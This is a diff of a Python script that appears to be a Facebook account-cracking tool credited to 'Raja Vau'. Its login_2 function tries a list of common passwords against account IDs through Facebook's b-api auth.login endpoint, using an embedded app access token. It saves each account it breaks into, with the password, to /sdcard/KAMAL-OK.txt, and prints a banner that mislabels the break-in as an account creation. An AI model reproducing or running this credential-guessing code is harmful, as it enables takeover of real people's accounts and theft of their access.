+                print(f"\033[1;32m║\033[1;33m [🔥] SUCCESSFUL FACEBOOK ACCOUNT CREATED [🔥] \033[1;32m║\033[0m")
+                print(f"\033[1;32m╠═════════════════════════════════════════════════╣\033[0m")
+                print(f"\033[1;32m║\033[1;36m 🇧🇩The Tolls Owner : Raja Vau🇧🇩              \033[1;32m║\033[0m")
+                print(f"\033[1;32m║\033[1;37m UID NUMBER : {uid:<35}\033[1;32m║\033[0m")
+                print(f"\033[1;32m║\033[1;37m FB PASWORD : {pw:<35}\033[1;32m║\033[0m")
+                print(f"\033[1;32m║\033[1;37m FB LINK    : https://www.facebook.com/{uid:<17}\033[1;32m║\033[0m")
+                print(f"\033[1;32m║\033[1;35m YEAR       : {acc_year:<35}\033[1;32m║\033[0m")
+                print(f"\033[1;32m╚═════════════════════════════════════════════════╝\033[0m\n")
+                open('/sdcard/KAMAL-OK.txt', 'a').write(f"{uid}|{pw}|{acc_year}\n")
                 oks.append(uid)
                 break
         loop += 1
     except Exception:
         time.sleep(5)
 
+
 def login_2(uid):
-    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mKAMAL -M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+    global loop
+    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m*\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mKAMAL-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m \x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m \x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m \x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+    sys.stdout.flush()
     
     for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
         try:
@@ -496,18 +541,41 @@ def login_2(uid):
                 url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                 po = session.get(url, headers=headers).json()
                 if 'session_key' in str(po):
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mKAMAL XD\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/KAMAL-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    acc_year = creationyear(uid)
+                    print(f"\n\033[1;32m╔═════════════════════════════════════════════════╗\033[0m")
+                    print(f"\033[1;32m║\033[1;33m [🔥] SUCCESSFUL FACEBOOK ACCOUNT CREATED [🔥] \033[1;32m║\033[0m")
+                    print(f"\033[1;32m╠═════════════════════════════════════════════════╣\033[0m")
+                    print(f"\033[1;32m║\033[1;36m 🇧🇩The Tolls Owner : Raja Vau🇧🇩              \033[1;32m║\033[0m")
+                    print(f"\033[1;32m║\033[1;37m UID NUMBER : {uid:<35}\033[1;32m║\033[0m")
+                    print(f"\033[1;32m║\033[1;37m FB PASWORD : {pw:<35}\033[1;32m║\033[0m")
+                    print(f"\033[1;32m║\033[1;37m FB LINK    : https://www.facebook.com/{uid:<17}\033[1;32m║\033[0m")
+                    print(f"\033[1;32m║\033[1;35m YEAR       : {acc_year:<35}\033[1;32m║\033[0m")
+                    print(f"\033[1;32m╚═════════════════════════════════════════════════╝\033[0m\n")
+                    open('/sdcard/KAMAL-OK.txt', 'a').write(f"{uid}|{pw}|{acc_year}\n")
                     oks.append(uid)
                     break
                 elif 'session_key' in po:
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mKAMAL \x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/KAMAL-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    acc_year = creationyear(uid)
+                    print(f"\n\033[1;32m╔═════════════════════════════════════════════════╗\033[0m")
+                    print(f"\033[1;32m║\033[1;33m [🔥] SUCCESSFUL FACEBOOK ACCOUNT CREATED [🔥] \033[1;32m║\033[0m")
+                    print(f"\033[1;32m╠═════════════════════════════════════════════════╣\033[0m")
+                    print(f"\033[1;32m║\033[1;36m 🇧🇩The Tolls Owner : Raja Vau🇧🇩              \033[1;32m║\033[0m")
+                    print(f"\033[1;32m║\033[1;37m UID NUMBER : {uid:<35}\033[1;32m║\033[0m")
+                    print(f"\033[1;32m║\033[1;37m FB PASWORD : {pw:<35}\033[1;32m║\033[0m")
+                    print(f"\033[1;32m║\033[1;37m FB LINK    : https://www.facebook.com/{uid:<17}\033[1;32m║\033[0m")
+                    print(f"\033[1;32m║\033[1;35m YEAR       : {acc_year:<35}\033[1;32m║\033[0m")
+                    print(f"\033[1;32m╚═════════════════════════════════════════════════╝\033[0m\n")
+                    open('/sdcard/KAMAL-OK.txt', 'a').write(f"{uid}|{pw}|{acc_year}\n")
                     oks.append(uid)
                     break
         except Exception as e:
             pass
     loop += 1
 
-if __name__ == '__main__':
-    BNG_71_()
+if __name__ == "__main__":
+    print(
+        "\033[1;32m"
+        "[✓] Main Tool Started Successfully!"
+        "\033[0m"
+    )
+    main_menu()
